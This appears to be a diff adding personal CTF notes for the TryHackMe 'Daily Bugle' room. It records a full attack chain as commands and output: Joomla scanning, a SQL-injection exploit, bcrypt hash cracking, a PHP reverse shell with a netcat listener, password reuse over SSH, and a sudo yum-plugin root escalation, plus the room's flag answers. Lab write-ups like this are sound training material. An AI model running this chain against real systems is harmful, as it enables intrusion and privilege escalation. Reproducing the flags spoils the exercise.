@@ -1,0 +1,56 @@
+Date:mar/9/2021
+Time:23:10
+
+gobuster dir -u http://10.10.5.80 -w /usr/share/wordlists/dirb/common.txt
+
+joomscan -u 10.10.5.80
+ python joomblah.py http://10.10.5.80/
+$ sudo  hashcat -a 0 -m 3200 hash /home/liki/tryhackme/daily_bugle/pass.txt --force --show
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+login:johna:spiderman123
+http://10.10.5.80/templates/beez3/index.php[php-reverse-shell]
+nc -lvnp 1234
+cd jjameson
+sh-4.2$ cat configuration.php
+public $password = 'nv5uz9r3ZEDzVjNu';
+ssh jjameson@10.10.5.80     
+jjameson@10.10.5.80's password: 
+Last login: Mon Dec 16 05:14:55 2019 from netwars
+[jjameson@dailybugle ~]$ ls
+user.txt
+
+[jjameson@dailybugle ~]$ cat user.txt
+ans:27a260fe3cba712cfdedb1c86d80442e
+
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+> import os
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+sh-4.2# ls
+user.txt
+sh-4.2# cd /root
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+
+sh-4.2# cat root.txt
+ans:eec3d53292b1821868266858d7fa6f79
+
